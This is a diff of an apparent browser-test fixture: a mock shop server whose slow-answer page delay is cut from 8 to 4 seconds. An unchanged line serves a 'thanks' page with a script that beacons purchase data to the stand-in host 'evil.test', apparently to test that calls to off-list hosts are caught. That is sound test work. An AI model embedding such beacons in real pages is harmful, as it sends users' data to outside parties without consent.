@@ -246,7 +246,7 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
           json: `f.onsubmit = (e) => { e.preventDefault(); fetch('/api/order', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ qty: f.qty.value }) }); };`,
           // the page of the answer sends an analytics beacon to an off-list host.
           thanks: `f.action = '/thanks';`,
-          // the site answers the post after 8 s, longer than the action timeout of the tests.
+          // the site answers the post after 4 s, longer than the action timeout of the tests (3 s).
           slow: `f.action = '/slow-answer';`,
         };
         const mode = new URL(path, 'http://x').searchParams.get('mode') ?? 'sync';
@@ -268,7 +268,7 @@ line two</textarea></label><label>File <input type="file" name="doc"></label><bu
       case 'shop.test/thanks':
         return send(200, html(`<h1>Thank you</h1><script>navigator.sendBeacon('${at('evil.test', '/collect?en=purchase')}', 'value=19.99')</script>`, 'Thanks'));
       case 'shop.test/slow-answer':
-        return void setTimeout(() => send(200, html('<h1>Paid</h1>', 'Paid')), 8000);
+        return void setTimeout(() => send(200, html('<h1>Paid</h1>', 'Paid')), 4000);
       case 'shop.test/products':
         // a product grid: each product has its own form with a button of the same name.
         return send(
